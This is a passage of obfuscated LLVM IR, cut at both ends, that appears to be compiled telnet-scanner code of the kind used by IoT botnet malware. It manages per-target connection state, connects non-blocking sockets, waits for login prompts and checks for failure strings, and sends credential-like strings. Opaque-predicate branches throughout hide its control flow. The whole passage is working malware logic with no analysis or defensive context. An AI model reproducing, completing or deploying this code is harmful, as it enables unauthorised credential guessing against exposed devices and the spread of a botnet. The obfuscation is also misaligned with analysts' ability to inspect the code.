  %224 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %223, i16* %224, align 2
  %225 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %226 = getelementptr inbounds [8 x i8], [8 x i8]* %225, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %226, i8 0, i64 8, i32 4, i1 false)
  %227 = load i32, i32* %2, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 2
  %231 = load i32, i32* %230, align 8
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  store i32 %231, i32* %233, align 4
  %234 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %235 = load i32, i32* %2, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 0
  store i32 %234, i32* %238, align 8
  %239 = load i32, i32* %2, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 0
  %243 = load i32, i32* %242, align 8
  %244 = icmp eq i32 %243, -1
  %245 = load i32, i32* @x.95
  %246 = load i32, i32* @y.96
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %244, label %253, label %254

; <label>:253:                                    ; preds = %originalBBpart224
  br label %1353

; <label>:254:                                    ; preds = %originalBBpart224
  %255 = load i32, i32* %2, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %256
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 8
  %260 = load i32, i32* %2, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 0
  %264 = load i32, i32* %263, align 8
  %265 = call i32 (i32, i32, ...) @fcntl(i32 %264, i32 3, i8* null)
  %266 = or i32 %265, 2048
  %267 = call i32 (i32, i32, ...) @fcntl(i32 %259, i32 4, i32 %266)
  %268 = load i32, i32* %2, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 8
  %273 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %274 = call i32 @connect(i32 %272, %struct.sockaddr* %273, i32 16)
  %275 = icmp eq i32 %274, -1
  br i1 %275, label %276, label %323

; <label>:276:                                    ; preds = %254
  %277 = load i32, i32* @x.95
  %278 = load i32, i32* @y.96
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %276
  %285 = call i32* @__errno_location() #10
  %286 = load i32, i32* %285, align 4
  %287 = icmp ne i32 %286, 115
  %288 = load i32, i32* @x.95
  %289 = load i32, i32* @y.96
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %287, label %296, label %323

; <label>:296:                                    ; preds = %originalBBpart228
  %297 = load i32, i32* @x.95
  %298 = load i32, i32* @y.96
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %296
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 8
  %310 = call i32 @sclose(i32 %309)
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 4
  store i8 1, i8* %314, align 1
  %315 = load i32, i32* @x.95
  %316 = load i32, i32* @y.96
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %332

; <label>:323:                                    ; preds = %originalBBpart228, %254
  %324 = load i32, i32* %2, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 3
  store i8 1, i8* %327, align 4
  %328 = load i32, i32* %2, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 9
  store i32 0, i32* %331, align 8
  br label %332

; <label>:332:                                    ; preds = %323, %originalBBpart232
  br label %1352

; <label>:333:                                    ; preds = %162
  br label %334

; <label>:334:                                    ; preds = %333
  %335 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i32 0, i32 0
  %336 = getelementptr inbounds [16 x i64], [16 x i64]* %335, i64 0, i64 0
  %337 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %336) #5, !srcloc !8
  %338 = extractvalue { i64, i64* } %337, 0
  %339 = extractvalue { i64, i64* } %337, 1
  %340 = trunc i64 %338 to i32
  store i32 %340, i32* %17, align 4
  %341 = ptrtoint i64* %339 to i64
  %342 = trunc i64 %341 to i32
  store i32 %342, i32* %18, align 4
  br label %343

; <label>:343:                                    ; preds = %334
  %344 = load i32, i32* @x.95
  %345 = load i32, i32* @y.96
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %343
  %352 = load i32, i32* @x.95
  %353 = load i32, i32* @y.96
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %360

; <label>:360:                                    ; preds = %originalBBpart236
  %361 = load i32, i32* @x.95
  %362 = load i32, i32* @y.96
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %360
  %369 = load i32, i32* %2, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 0
  %373 = load i32, i32* %372, align 8
  %374 = srem i32 %373, 64
  %375 = zext i32 %374 to i64
  %376 = shl i64 1, %375
  %377 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i32 0, i32 0
  %378 = load i32, i32* %2, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %379
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %380, i32 0, i32 0
  %382 = load i32, i32* %381, align 8
  %383 = sdiv i32 %382, 64
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds [16 x i64], [16 x i64]* %377, i64 0, i64 %384
  %386 = load i64, i64* %385, align 8
  %387 = or i64 %386, %376
  store i64 %387, i64* %385, align 8
  %388 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 0, i64* %388, align 8
  %389 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 10000, i64* %389, align 8
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 8
  %395 = add nsw i32 %394, 1
  %396 = call i32 @select(i32 %395, %struct.fd_set* null, %struct.fd_set* %9, %struct.fd_set* null, %struct.timeval* %10)
  store i32 %396, i32* %3, align 4
  %397 = load i32, i32* %3, align 4
  %398 = icmp eq i32 %397, 1
  %399 = load i32, i32* @x.95
  %400 = load i32, i32* @y.96
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart270, label %originalBB38alteredBB

originalBBpart270:                                ; preds = %originalBB38
  br i1 %398, label %407, label %496

; <label>:407:                                    ; preds = %originalBBpart270
  store i32 4, i32* %11, align 4
  store i32 0, i32* %5, align 4
  %408 = load i32, i32* %2, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 0
  %412 = load i32, i32* %411, align 8
  %413 = bitcast i32* %5 to i8*
  %414 = call i32 @getsockopt(i32 %412, i32 1, i32 4, i8* %413, i32* %11) #5
  %415 = load i32, i32* %5, align 4
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %432

; <label>:417:                                    ; preds = %407
  %418 = load i32, i32* %2, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = call i32 @sclose(i32 %422)
  %424 = load i32, i32* %2, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 3
  store i8 0, i8* %427, align 4
  %428 = load i32, i32* %2, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 4
  store i8 1, i8* %431, align 1
  br label %479

; <label>:432:                                    ; preds = %407
  %433 = load i32, i32* @x.95
  %434 = load i32, i32* @y.96
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %432
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 8
  %446 = load i32, i32* %2, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 8
  %451 = call i32 (i32, i32, ...) @fcntl(i32 %450, i32 3, i8* null)
  %452 = and i32 %451, -2049
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %445, i32 4, i32 %452)
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 9
  store i32 0, i32* %457, align 8
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 10
  store i16 0, i16* %461, align 4
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 11
  %466 = load i8*, i8** %465, align 8
  call void @llvm.memset.p0i8.i64(i8* %466, i8 0, i64 253, i32 1, i1 false)
  %467 = load i32, i32* %2, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 3
  store i8 2, i8* %470, align 4
  %471 = load i32, i32* @x.95
  %472 = load i32, i32* @y.96
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart290, label %originalBB72alteredBB

originalBBpart290:                                ; preds = %originalBB72
  br label %479

; <label>:479:                                    ; preds = %originalBBpart290, %417
  %480 = load i32, i32* @x.95
  %481 = load i32, i32* @y.96
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %479
  %488 = load i32, i32* @x.95
  %489 = load i32, i32* @y.96
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %1353

; <label>:496:                                    ; preds = %originalBBpart270
  %497 = load i32, i32* @x.95
  %498 = load i32, i32* @y.96
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %496
  %505 = load i32, i32* %3, align 4
  %506 = icmp eq i32 %505, -1
  %507 = load i32, i32* @x.95
  %508 = load i32, i32* @y.96
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %506, label %515, label %530

; <label>:515:                                    ; preds = %originalBBpart298
  %516 = load i32, i32* %2, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 8
  %521 = call i32 @sclose(i32 %520)
  %522 = load i32, i32* %2, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 3
  store i8 0, i8* %525, align 4
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 4
  store i8 1, i8* %529, align 1
  br label %1353

; <label>:530:                                    ; preds = %originalBBpart298
  br label %531

; <label>:531:                                    ; preds = %530
  %532 = load i32, i32* @x.95
  %533 = load i32, i32* @y.96
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %531
  %540 = load i32, i32* %2, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 9
  %544 = load i32, i32* %543, align 8
  %545 = add i32 %544, 6
  %546 = zext i32 %545 to i64
  %547 = call i64 @time(i64* null) #5
  %548 = icmp slt i64 %546, %547
  %549 = load i32, i32* @x.95
  %550 = load i32, i32* @y.96
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart2105, label %originalBB100alteredBB

originalBBpart2105:                               ; preds = %originalBB100
  br i1 %548, label %557, label %572

; <label>:557:                                    ; preds = %originalBBpart2105
  %558 = load i32, i32* %2, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 8
  %563 = call i32 @sclose(i32 %562)
  %564 = load i32, i32* %2, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 3
  store i8 0, i8* %567, align 4
  %568 = load i32, i32* %2, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 4
  store i8 1, i8* %571, align 1
  br label %572

; <label>:572:                                    ; preds = %557, %originalBBpart2105
  %573 = load i32, i32* @x.95
  %574 = load i32, i32* @y.96
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %572
  %581 = load i32, i32* @x.95
  %582 = load i32, i32* @y.96
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %1352

; <label>:589:                                    ; preds = %162
  %590 = load i32, i32* @x.95
  %591 = load i32, i32* @y.96
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %589
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 0
  %602 = load i32, i32* %601, align 8
  %603 = load i32, i32* %2, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 11
  %607 = load i8*, i8** %606, align 8
  %608 = call i32 @read_until_response(i32 %602, i32 10000, i8* %607, i32 253, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %609 = icmp ne i32 %608, 0
  %610 = load i32, i32* @x.95
  %611 = load i32, i32* @y.96
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %609, label %618, label %653

; <label>:618:                                    ; preds = %originalBBpart2113
  %619 = load i32, i32* @x.95
  %620 = load i32, i32* @y.96
  %621 = sub i32 %619, 1
  %622 = mul i32 %619, %621
  %623 = urem i32 %622, 2
  %624 = icmp eq i32 %623, 0
  %625 = icmp slt i32 %620, 10
  %626 = or i1 %624, %625
  br i1 %626, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %618
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 11
  %631 = load i8*, i8** %630, align 8
  %632 = call i32 @contains_fail(i8* %631)
  %633 = icmp ne i32 %632, 0
  %634 = load i32, i32* @x.95
  %635 = load i32, i32* @y.96
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br i1 %633, label %642, label %647

; <label>:642:                                    ; preds = %originalBBpart2117
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 3
  store i8 0, i8* %646, align 4
  br label %652

; <label>:647:                                    ; preds = %originalBBpart2117
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 3
  store i8 3, i8* %651, align 4
  br label %652

; <label>:652:                                    ; preds = %647, %642
  br label %1353

; <label>:653:                                    ; preds = %originalBBpart2113
  %654 = load i32, i32* %2, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %655
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %656, i32 0, i32 9
  %658 = load i32, i32* %657, align 8
  %659 = add i32 %658, 6
  %660 = zext i32 %659 to i64
  %661 = call i64 @time(i64* null) #5
  %662 = icmp slt i64 %660, %661
  br i1 %662, label %663, label %672

; <label>:663:                                    ; preds = %653
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 3
  store i8 0, i8* %667, align 4
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 4
  store i8 1, i8* %671, align 1
  br label %672

; <label>:672:                                    ; preds = %663, %653
  br label %1352

; <label>:673:                                    ; preds = %162
  %674 = load i32, i32* @x.95
  %675 = load i32, i32* @y.96
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %673
  %682 = load i32, i32* %2, align 4
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %683
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %684, i32 0, i32 0
  %686 = load i32, i32* %685, align 8
  %687 = call i64 @send(i32 %686, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.863, i32 0, i32 0), i64 7, i32 16384)
  %688 = icmp slt i64 %687, 0
  %689 = load i32, i32* @x.95
  %690 = load i32, i32* @y.96
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br i1 %688, label %697, label %706

; <label>:697:                                    ; preds = %originalBBpart2121
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 3
  store i8 0, i8* %701, align 4
  %702 = load i32, i32* %2, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 4
  store i8 1, i8* %705, align 1
  br label %1353

; <label>:706:                                    ; preds = %originalBBpart2121
  %707 = load i32, i32* @x.95
  %708 = load i32, i32* @y.96
  %709 = sub i32 %707, 1
  %710 = mul i32 %707, %709
  %711 = urem i32 %710, 2
  %712 = icmp eq i32 %711, 0
  %713 = icmp slt i32 %708, 10
  %714 = or i1 %712, %713
  br i1 %714, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %706
  %715 = load i32, i32* %2, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 3
  store i8 4, i8* %718, align 4
  %719 = load i32, i32* @x.95
  %720 = load i32, i32* @y.96
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %1352

; <label>:727:                                    ; preds = %162
  %728 = load i32, i32* %2, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 0
  %732 = load i32, i32* %731, align 8
  %733 = load i32, i32* %2, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 11
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @read_until_response(i32 %732, i32 10000, i8* %737, i32 253, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %739 = icmp ne i32 %738, 0
  br i1 %739, label %740, label %791

; <label>:740:                                    ; preds = %727
  %741 = load i32, i32* @x.95
  %742 = load i32, i32* @y.96
  %743 = sub i32 %741, 1
  %744 = mul i32 %741, %743
  %745 = urem i32 %744, 2
  %746 = icmp eq i32 %745, 0
